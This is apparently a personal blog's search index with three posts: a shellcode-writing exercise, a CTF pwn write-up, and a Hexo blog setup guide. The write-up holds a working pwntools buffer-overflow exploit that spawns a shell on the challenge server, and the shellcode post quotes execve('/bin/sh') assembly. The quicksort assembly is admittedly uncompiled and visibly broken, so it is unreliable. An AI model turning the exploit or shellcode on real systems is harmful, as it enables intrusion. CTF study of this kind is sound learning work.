<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>First Assignment from Kap0k</title>
    <url>/2021/01/16/First-Assignment-from-Kap0k/</url>
    <content><![CDATA[<h2 id="手撕shellcode"><a href="#手撕shellcode" class="headerlink" title="手撕shellcode"></a>手撕shellcode</h2><p>最后的结果是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\x31\xc0\x50\x68\x66\x69\x6c\x65\x68\x74\x65\x73\x74\x89\xe3\x50\x53\x31\xc9\xb1\x02\xb0\x05\xcd\x80\x89\xc3\x31\xc0\x50\x68\x6f\x72\x6c\x64\x68\x6f\x2c\x20\x77\x68\x68\x65\x6c\x6c\x89\xe1\x50\x51\x31\xd2\xb2\x0c\xb0\x04\xcd\x80\x31\xdb\x31\xc0\xb0\x01\xcd\x80</span><br></pre></td></tr></table></figure>
<h3 id="最初的思路"><a href="#最初的思路" class="headerlink" title="最初的思路"></a>最初的思路</h3><p>查了很久资料，最后才在google上找到有用的东西。（用i386编译出来的）</p>
<p>最简单的写法自然是这样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db &quot;Hello, world!&quot;, 0xa</span><br><span class="line">    len equ $ - msg</span><br><span class="line">    filename db &quot;sb&quot;</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">    ;xor edx, edx</span><br><span class="line">    mov ecx, 2</span><br><span class="line">    mov ebx, filename</span><br><span class="line">    mov eax, 5</span><br><span class="line">    int 0x80</span><br><span class="line">    </span><br><span class="line">    mov ebx, eax</span><br><span class="line">    mov ecx, msg</span><br><span class="line">    mov edx, 12</span><br><span class="line">    mov eax, 4</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">    mov ebx, 0</span><br><span class="line">    mov eax, 1</span><br><span class="line">    int 0x80</span><br></pre></td></tr></table></figure>
<p>这里所运用到的是linux kernel里面的syscall指令，通过<code>int 0x80</code>的软中断来执行底层函数。</p>
<p>我们用到的有<code>sys_open</code>和<code>sys_write</code>两个函数，他们的用法如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">4.</span> sys_write</span><br><span class="line">Syntax: <span class="function"><span class="keyword">ssize_t</span> <span class="title">sys_write</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">char</span> * buf, <span class="keyword">size_t</span> count)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">Source: fs/read_write.c</span><br><span class="line"></span><br><span class="line">Action: write to a file descriptor</span><br><span class="line"></span><br><span class="line">Details:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> sys_open</span><br><span class="line">Syntax: <span class="function"><span class="keyword">int</span> <span class="title">sys_open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * filename, <span class="keyword">int</span> flags, <span class="keyword">int</span> mode)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">Source: fs/open.c</span><br><span class="line"></span><br><span class="line">Action: open <span class="keyword">and</span> possibly create a file <span class="keyword">or</span> device</span><br><span class="line"></span><br><span class="line">Details:</span><br></pre></td></tr></table></figure>
<p><code>sys_open</code>的第二个参数<code>flags</code>中，<code>0</code>代表只读，<code>1</code>代表只写，<code>2</code>代表可读写。</p>
<p>这里试了一下，第三个参数可以不用去控制，默认留0没问题。</p>
<p>然后<code>sys_open</code>的返回值是一个文件描述数字，这个概念可以参考stdin是0，stdout是1，反正就是一个在<code>sys_write</code>调用的时候，第一个参数填的值。</p>
<p>然后就是照着规定填好寄存器，最后<code>int 0x80</code>调用一下就可以执行函数了。最后再<code>sys_exit</code>退出就可以了。</p>
<p>编译命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nasm -f elf helloworld.asm</span><br><span class="line">$ ld -m elf_i386 -s -o shellcode helloworld.o</span><br></pre></td></tr></table></figure>
<p>不过这样编译过后会发现机器码里面一大堆都是<code>\x00</code>，不符合要求；并且存在常量字符串，没法在shellcode中跳到里面的奇妙地址来读取字符串。</p>
<h3 id="Inspiration"><a href="#Inspiration" class="headerlink" title="Inspiration"></a>Inspiration</h3><p>在搜索如何从汇编到shellcode的过程中，看到了一个教怎么弄出shell的教程，它的汇编是这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xor    %eax,%eax</span><br><span class="line">push   %eax</span><br><span class="line">push   $0x68732f2f</span><br><span class="line">push   $0x6e69622f</span><br><span class="line">mov    %esp,%ebx</span><br><span class="line">push   %eax</span><br><span class="line">push   %ebx</span><br><span class="line">mov    %esp,%ecx</span><br><span class="line">mov    $0xb,%al</span><br><span class="line">int    $0x80</span><br></pre></td></tr></table></figure>
<p>仔细研究它的写法，我们下面的解决方案就来自这段汇编的细节。（其实改编下就能用了）</p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><h4 id="去除-x00"><a href="#去除-x00" class="headerlink" title="去除\x00"></a>去除\x00</h4><p>我们通过几个技巧来实现：</p>
<ol>
<li><code>mov eax, 0</code>转而通过<code>mov eax, eax</code>来实现。</li>
<li><code>mov eax, 1</code>转而通过<code>mov al, 1</code>来实现。（前提是eax高位也没问题）</li>
</ol>
<h4 id="在shellcode中注入常量字符串"><a href="#在shellcode中注入常量字符串" class="headerlink" title="在shellcode中注入常量字符串"></a>在shellcode中注入常量字符串</h4><p>我们没法把我们想要的字符串在被注入的程序中找到，所以还是得存在栈里面。</p>
<p>不过怎么存呢？通过push来存。</p>
<p>然后就有非常强的技巧：将字符串翻转后变成十六进制编码，每8位每8位的push进去，最后从栈顶开始的字符串就是我们想要的字符串。</p>
<p>但是又有问题：这样会不会又产生<code>\x00</code>？</p>
<p>其实有可能，所以我们无论如何，长度都补齐到4的整数倍。这样就可以保证没有<code>\x00</code>了。</p>
<p>最终我的shellcode输出至名字为<code>testfile</code>的文件中，输入内容为<code>hello, world</code>。</p>
<p>缺点是<code>testfile</code>必须要先存在然后才能写进去，这应该和我在<code>sys_open</code>的时候，<code>flags</code>的取值有关系。有时间的话再去探究这个参数到底该怎么取。</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/First-Assignment-from-Kap0k/objdump.png">
<p>最后通过一个在网上找到的命令，直接提取出了机器码，生成了shellcode，省去了一个字节一个字节手抄出来的麻烦：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ objdump -d .&#x2F;shellcode|grep &#39;[0-9a-f]:&#39;|grep -v &#39;file&#39;|cut -f2 -d:|cut -f1-6 -d&#39; &#39;|tr -s &#39; &#39;|tr &#39;\t&#39; &#39; &#39;|sed &#39;s&#x2F; $&#x2F;&#x2F;g&#39;|sed &#39;s&#x2F; &#x2F;\\x&#x2F;g&#39;|paste -d &#39;&#39; -s |sed &#39;s&#x2F;^&#x2F;&quot;&#x2F;&#39;|sed &#39;s&#x2F;$&#x2F;&quot;&#x2F;g&#39;</span><br></pre></td></tr></table></figure>
<h2 id="汇编快排"><a href="#汇编快排" class="headerlink" title="汇编快排"></a>汇编快排</h2><p>直接用汇编写出快排我做不到，就先写个c出来吧。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> *a, <span class="keyword">int</span> *b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">qsort</span><span class="params">(<span class="keyword">int</span> *start, <span class="keyword">int</span> *end)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = (end - start);</span><br><span class="line">    <span class="keyword">int</span> pivot = *(start + (len &gt;&gt; <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">int</span> *i = start, *j = end;</span><br><span class="line">    <span class="keyword">while</span>(i &lt;= j) &#123;</span><br><span class="line">        <span class="keyword">while</span>(*i &lt; pivot) i++;</span><br><span class="line">        <span class="keyword">while</span>(*j &gt; pivot) j--;</span><br><span class="line">        <span class="keyword">if</span>(i &lt;= j) swap(i++, j--);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i &lt; end) qsort(i, end);</span><br><span class="line">    <span class="keyword">if</span>(start &lt; j) qsort(start, j);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    qsort(a, a + <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后来发现汇编里面要写指针的话就好麻烦，干脆重新改一改：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">qsort</span><span class="params">(<span class="keyword">int</span> *a, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> pivot = a[mid];</span><br><span class="line">    <span class="keyword">int</span> i = l, j = r;</span><br><span class="line">    <span class="keyword">while</span>(i &lt;= j) &#123;</span><br><span class="line">        <span class="keyword">while</span>(a[i] &lt; pivot) i++;</span><br><span class="line">        <span class="keyword">while</span>(a[j] &gt; pivot) j--;</span><br><span class="line">        <span class="keyword">if</span>(i &lt;= j) swap(a, i++, j--);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i &lt; r) qsort(a, i, r);</span><br><span class="line">    <span class="keyword">if</span>(l &lt; j) qsort(a, l, j);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看了师傅的代码，发现可以用r8到r11的这4个寄存器来存，顿时方便了很多。<del>本来还以为要一直存在栈上</del></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">global _start</span><br><span class="line"></span><br><span class="line">section .data</span><br><span class="line">    a: dd 1, 1, 4, 5, 1, 4, 2, 0, 7, 7</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">    mov rdi, a</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    mov rdx, 10</span><br><span class="line">    call qsort</span><br><span class="line">    mov rax, 60</span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">swap:</span><br><span class="line">    ; rdi: a, rsi: i, rdx: j</span><br><span class="line">    mov ebx, QWORD [rdi + 4 * rsi]</span><br><span class="line">    mov ecx, QWORD [rdi + 4 * rdx]</span><br><span class="line">    mov QWORD [rdi + 4 * rsi], ecx</span><br><span class="line">    mov QWORD [rdi + 4 * rdx], ebx</span><br><span class="line"></span><br><span class="line">qsort:</span><br><span class="line">    ; rdi: a, rsi: start, rdx: end</span><br><span class="line">    mov r8, rsi ; start</span><br><span class="line">    mov r9, rdx ; end</span><br><span class="line">    mov r10, r8 ; i</span><br><span class="line">    mov r11, r9 ; j</span><br><span class="line">    mov rbx, r9</span><br><span class="line">    add rbx, r8</span><br><span class="line">    sar rbx</span><br><span class="line">    mov ebx, DWORD [r8 + 4 * rbx]</span><br><span class="line">    loop:</span><br><span class="line">        cmp r10, r11</span><br><span class="line">        jg after_loop1</span><br><span class="line">        i_loop:</span><br><span class="line">            mov eax, DWORD [r8 + 4 * r10]</span><br><span class="line">            cmp eax, ebx</span><br><span class="line">            jge j_loop</span><br><span class="line">            inc r10</span><br><span class="line">            jmp i_loop</span><br><span class="line">        j_loop:</span><br><span class="line">            mov eax, DWORD [r8 + 4 * r11]</span><br><span class="line">            cmp eax, ebx</span><br><span class="line">            jle swap_i_j</span><br><span class="line">            dec r11</span><br><span class="line">            jmp j_loop</span><br><span class="line">        swap_i_j:</span><br><span class="line">            cmp r10, r11</span><br><span class="line">            jg loop</span><br><span class="line">            mov rdi, a</span><br><span class="line">            mov rsi, r10</span><br><span class="line">            mov rdx, r11</span><br><span class="line">            call swap</span><br><span class="line">            inc r8</span><br><span class="line">            dec r9</span><br><span class="line">            jmp loop</span><br><span class="line">    after_loop1:</span><br><span class="line">        cmp r10 r9</span><br><span class="line">        jge after_loop2</span><br><span class="line">        mov rdi, a</span><br><span class="line">        mov rsi, r10</span><br><span class="line">        mov rdx, r9</span><br><span class="line">        push r8</span><br><span class="line">        push r9</span><br><span class="line">        push r10</span><br><span class="line">        push r11</span><br><span class="line">        call qsort</span><br><span class="line">        pop r11</span><br><span class="line">        pop r10</span><br><span class="line">        pop r9</span><br><span class="line">        pop r8</span><br><span class="line"></span><br><span class="line">    after_loop2:</span><br><span class="line">        cmp r8 r11</span><br><span class="line">        jge return</span><br><span class="line">        mov rdi, a</span><br><span class="line">        mov rsi, r8</span><br><span class="line">        mov rdx, r11</span><br><span class="line">        push r8</span><br><span class="line">        push r9</span><br><span class="line">        push r10</span><br><span class="line">        push r11</span><br><span class="line">        call qsort</span><br><span class="line">        pop r11</span><br><span class="line">        pop r10</span><br><span class="line">        pop r9</span><br><span class="line">        pop r8</span><br><span class="line">    return:</span><br><span class="line">        ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>没编译过，不过觉得问题不大。但愿如此（x</p>
]]></content>
      <tags>
        <tag>Kap0k, pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Jan 14 Writeup</title>
    <url>/2021/01/14/Jan-14-Writeup/</url>
    <content><![CDATA[<h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><p>傻了傻了，居然没想到用ROPgadget来找字符串，而只是在IDA Pro中看了而已。</p>
<p>system函数已经在Print函数中给出来了。只要有一个<code>/bin/sh</code>就够了。</p>
<p>但是这样也不准确，只需要<code>sh</code>就可以了。</p>
<p>以后找字符串的时候，直接用ROPgadget，不只能找gadget好吧。。。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➜  ciscn_2019_ne_5 ROPgadget --binary pwn --string &#39;sh&#39;</span><br><span class="line">Strings information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x080482ea : sh</span><br></pre></td></tr></table></figure><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">27077</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x48</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x4</span> + p32(system_plt) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x080482ea</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input admin password:&#x27;</span>, <span class="string">&#x27;administrator&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;0.Exit\n:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input new log info:&#x27;</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;0.Exit\n:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>My Hexo Blog Configuration</title>
    <url>/2021/01/08/My-Hexo-Blog-Configuration/</url>
    <content><![CDATA[<p>芜湖！起飞！今天备案终于审核通过了！捣鼓了一下，终于把博客弄得像模像样的，就顺带记录一下！</p>
<h2 id="序幕"><a href="#序幕" class="headerlink" title="序幕"></a>序幕</h2><p>军训汇操在早上结束了，回到宿舍一打开手机就连收到三条信息，终于给爷备案好了！</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/My-Hexo-Blog-Configuration/WeChat_Image_20210108221637.jpg">
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/My-Hexo-Blog-Configuration/WeChat_Image_20210108221657.jpg">
<p>我啪的一下就开始准备我的博客了，很快啊！</p>
<h2 id="博客框架"><a href="#博客框架" class="headerlink" title="博客框架"></a>博客框架</h2><p>博客使用Hexo搭建，用了NexT主题(NexT.Gemini)，在GitHub上就能找到这个主题。</p>
<p>Hexo只要有npm就可以安装了，跑条命令安装一下就行。</p>
<p>Hexo的操作可以直接看官方文档，也很容易懂，这里不赘述。</p>
<p>GitHub Pages之前就配置好了，现在主要是需要配置到我的服务器上面去。</p>
<h2 id="Hexo同步至服务器"><a href="#Hexo同步至服务器" class="headerlink" title="Hexo同步至服务器"></a>Hexo同步至服务器</h2><p>首先，在服务器上面安装一下git和nginx。在备案没有成功的时候，可以直接用买服务器时给的弹性公网IP直接去上，效果是一样的。</p>
<p>按照我的印象，当没有安装nginx时，在浏览器中输入ip打开，是会出现小恐龙的，而安装了nginx之后就成了404。这说明nginx确实已经开始起作用了，安装正常。</p>
<p>然后可以在服务器那端用ssh免密登录，粗略流程是这样的：</p>
<ol>
<li>在本机用<code>ssh-keygen</code>创建一个ssh公钥和私钥。</li>
<li>在服务器的<code>.ssh</code>目录创建一个<code>authorized_keys</code>，再<code>chmod</code>一下。</li>
<li>把ssh公钥写到<code>authorized_keys</code>上面去。</li>
</ol>
<p>这个时候，只要本机有私钥，服务器有公钥，我们就可以通过一个ssh命令免密远程登录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ssh root@&quot;your_ip&quot;</span><br></pre></td></tr></table></figure>
<p>之后创建<code>/var/repo</code>文件夹，在里面新建一个叫blog的git仓库，新建命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git init --bare blog.git</span><br></pre></td></tr></table></figure>
<p>之后，打开<code>blog.git/hooks/post-receive</code>，<code>chmod</code>一下，同时添加下列内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">git --work-tree&#x3D;&#x2F;var&#x2F;www&#x2F;hexo --git-dir&#x3D;&#x2F;var&#x2F;repo&#x2F;blog.git checkout -f</span><br></pre></td></tr></table></figure>
<p>之后，在<code>var/www/hexo</code>处创建好文件夹，<code>chmod</code>一下，这样之后，服务器端的设置就完成了。</p>
<p>最终我们想要的是：在本机输入<code>hexo d</code>时，能部署到服务器上，这时需要在根目录下的<code>_config.yml</code>下修改：</p>
<h3 id="第一处"><a href="#第一处" class="headerlink" title="第一处"></a>第一处</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># URL</span><br><span class="line">## If your site is put in a subdirectory, set url as &#39;http:&#x2F;&#x2F;example.com&#x2F;child&#39; and root as &#39;&#x2F;child&#x2F;&#39;</span><br><span class="line">url: https:&#x2F;&#x2F;your_ip</span><br></pre></td></tr></table></figure>
<h3 id="第二处"><a href="#第二处" class="headerlink" title="第二处"></a>第二处</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  - type: git</span><br><span class="line">    repo: git@github.com:Garen-Wang&#x2F;garen-wang.github.io.git</span><br><span class="line">    branch: master</span><br><span class="line">  - type: git</span><br><span class="line">    repo: root@your_ip:&#x2F;var&#x2F;repo&#x2F;blog.git</span><br><span class="line">    branch: master</span><br></pre></td></tr></table></figure>
<p>这样就应该能把hexo部署到你的服务器上面去了。</p>
<h2 id="添加备案号"><a href="#添加备案号" class="headerlink" title="添加备案号"></a>添加备案号</h2><p>网站还是得加备案号的，不过这里不用改模板，直接在NexT主题的<code>_config.yml</code>中修改：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">footer:</span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">  # Beian ICP and gongan information for Chinese users. See: http:&#x2F;&#x2F;www.beian.miit.gov.cn, http:&#x2F;&#x2F;www.beian.gov.cn</span><br><span class="line">  beian:</span><br><span class="line">    enable: true</span><br><span class="line">    icp: 粤ICP备2021003110号</span><br><span class="line">    # The digit in the num of gongan beian.</span><br><span class="line">    gongan_id:</span><br><span class="line">    # The full num of gongan beian.</span><br><span class="line">    gongan_num: 2021003110</span><br><span class="line">    # The icon for gongan beian. See: http:&#x2F;&#x2F;www.beian.gov.cn&#x2F;portal&#x2F;download</span><br><span class="line">    gongan_icon_url: images&#x2F;beian.png</span><br></pre></td></tr></table></figure>
<p>在主题文件夹中的<code>source</code>中新建个<code>images</code>文件夹，可以把<a href="http://www.beian.gov.cn/portal/download">这张图片</a>下载到里面去，就可以用相对路径引用了。btw，对头像的设置也是同理。</p>
<h2 id="mathjax支持"><a href="#mathjax支持" class="headerlink" title="mathjax支持"></a>mathjax支持</h2><p>这个东西曾经困扰了我很久，其实只要按下面的顺序，NexT主题也能用上mathjax。</p>
<p>先更换Hexo的Markdown渲染引擎：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure>
<p>需要在<code>node_modules/kramed/lib/rules/inline.js</code>中修改两处（分别是原第11行和第20行）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;escape: &#x2F;^\\([\\&#96;*&#123;&#125;\[\]()#$+\-.!_&gt;])&#x2F;,</span><br><span class="line">escape: &#x2F;^\\([&#96;*\[\]()#$+\-.!_&gt;])&#x2F;,</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;em: &#x2F;^\b_((?:__|[\s\S])+?)_\b|^\*((?:\*\*|[\s\S])+?)\*(?!\*)&#x2F;,</span><br><span class="line">em: &#x2F;^\*((?:\*\*|[\s\S])+?)\*(?!\*)&#x2F;,</span><br></pre></td></tr></table></figure>
<p>最后在每个需要启用mathjax的博客页面里，在一开始的Front-matter那里加上一句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mathjax: true</span><br></pre></td></tr></table></figure>
<p>这样就可以用上LaTeX语法写行内公式和行间公式了。</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/My-Hexo-Blog-Configuration/2021-01-08_23-29.png">
<h2 id="搜索框"><a href="#搜索框" class="headerlink" title="搜索框"></a>搜索框</h2><p>搜索框也很容易实现。</p>
<p>先用npm安装下插件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install --save hexo-generator-search</span><br><span class="line">$ npm install --save hexo-generator-searchdb</span><br></pre></td></tr></table></figure>
<p>在NexT主题文件夹下的<code>_config.yml</code>下修改：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local_search:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure>
<p>重新部署一下之后，就可以看到出现了搜索框。</p>
<h2 id="评论系统支持"><a href="#评论系统支持" class="headerlink" title="评论系统支持"></a>评论系统支持</h2><p>评论系统中，NexT主题的配置中自带对Valine的支持，我们干脆直接用它咯！</p>
<h3 id="Valine的使用"><a href="#Valine的使用" class="headerlink" title="Valine的使用"></a>Valine的使用</h3><ol>
<li>在LeanCloud注册</li>
<li>创建应用，名称随意</li>
<li>进入“设置-应用Keys”，获取App ID和AppKey</li>
<li>在主题文件夹中的<code>_config.yml</code>修改Valine对应内容为：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">valine:</span><br><span class="line">  enable: true</span><br><span class="line">  appid: Your leancloud application appid</span><br><span class="line">  appkey: Your leancloud application appkey</span><br><span class="line">  notify: true # Mail notifier</span><br><span class="line">  verify: false # Verification code</span><br><span class="line">  placeholder: Just go go # Comment box placeholder</span><br><span class="line">  avatar: mm # Gravatar style</span><br><span class="line">  guest_info: nick,mail,link # Custom comment header</span><br><span class="line">  pageSize: 10 # Pagination size</span><br><span class="line">  language: zh-cn # Language, available values: en, zh-cn</span><br><span class="line">  visitor: true # Article reading statistic</span><br><span class="line">  comment_count: true # If false, comment count will only be displayed in post page, not in home page</span><br><span class="line">  recordIP: false # Whether to record the commenter IP</span><br><span class="line">  serverURLs: # When the custom domain name is enabled, fill it in here (it will be detected automatically by default, no need to fill in)</span><br><span class="line">  #post_meta_order: 0</span><br></pre></td></tr></table></figure>
<p>然后在储存-结构化数据中创建两个新的Class，名称分别为<code>Comment</code>和<code>Counter</code>，分别可以用来存评论和链接访问数，非常方便。</p>
<p>在LeanCloud后台看到的数据就是这样的：</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/My-Hexo-Blog-Configuration/2021-01-08_22-44.png">
<p>之后部署一下就可以看到效果了！</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/My-Hexo-Blog-Configuration/2021-01-08_22-42.png">
<h2 id="七牛云图床"><a href="#七牛云图床" class="headerlink" title="七牛云图床"></a>七牛云图床</h2><p>首先先在博客根目录安装一下需要的Hexo插件：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install --save hexo-qiniu-sync</span><br></pre></td></tr></table></figure><br>在七牛云右上角的密钥管理就可以找到access key和secret key了，bucket填你自己创建时写的空间名称，在<code>_config.yml</code>里面添加这一段配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">qiniu:</span><br><span class="line">  offline: false</span><br><span class="line">  sync: true</span><br><span class="line">  bucket: &quot;your_bucket_name&quot;</span><br><span class="line">  access_key: &quot;your_access_key&quot;</span><br><span class="line">  secret_key: &quot;your_secret_key&quot;</span><br><span class="line">  dirPrefix: static</span><br><span class="line">  urlPrefix: http:&#x2F;&#x2F;&quot;your_qiniu_url&quot;&#x2F;static</span><br><span class="line">  up_host: http:&#x2F;&#x2F;upload.qiniu.com</span><br><span class="line">  local_dir: static</span><br><span class="line">  update_exist: true</span><br><span class="line">  image: </span><br><span class="line">    folder: images</span><br><span class="line">    extend: </span><br><span class="line">  js:</span><br><span class="line">    folder: js</span><br><span class="line">  css:</span><br><span class="line">    folder: css</span><br></pre></td></tr></table></figure>
<p>在文档中，就不需要使用Markdown的插入图片格式了，使用下面的格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% qnimg test.jpg %&#125;</span><br></pre></td></tr></table></figure>
<p>这样的语句会自动读取<code>static/images/test.jpg</code>这个路径下的图片。</p>
<p>在更新博客时，可以先跑一下这条命令，将<code>static/images</code>下的所有图片都上传到七牛云，这样博客的外链就能访问出图片了。</p>
<p>不过不跑似乎也没关系，在<code>hexo g</code>的时候似乎会自动帮你上传，挺贴心的。</p>
<h2 id="小彩蛋"><a href="#小彩蛋" class="headerlink" title="小彩蛋"></a>小彩蛋</h2><h3 id="我大E了啊"><a href="#我大E了啊" class="headerlink" title="我大E了啊"></a>我大E了啊</h3><p>在配置的时候有一次跑<code>hexo g -d</code>的时候报错了，怎么改都改不好，心态差点崩了，差点要把整个博客重新弄一遍。</p>
<p>这种情况的最好解决方法是一开始就用git维护整个仓库。最后我直接用<code>git reset</code>回滚到上次commit的时候，一切就又都回来了。我又继续无止境地配置下去了……</p>
<h3 id="什么？DDL？"><a href="#什么？DDL？" class="headerlink" title="什么？DDL？"></a>什么？DDL？</h3><p>啊？什么？我今天没赶DDL？</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/My-Hexo-Blog-Configuration/WeChat_Image_20210108221702.jpg">
<p>其实明天是数创大作业的deadline。。。</p>
<p>放心，明天弄得完的。deadline是第一生产力。。。</p>
<p>熬夜继续爆肝大作业，还不如早点休息。。。</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/My-Hexo-Blog-Configuration/84869490_p0.jpg">
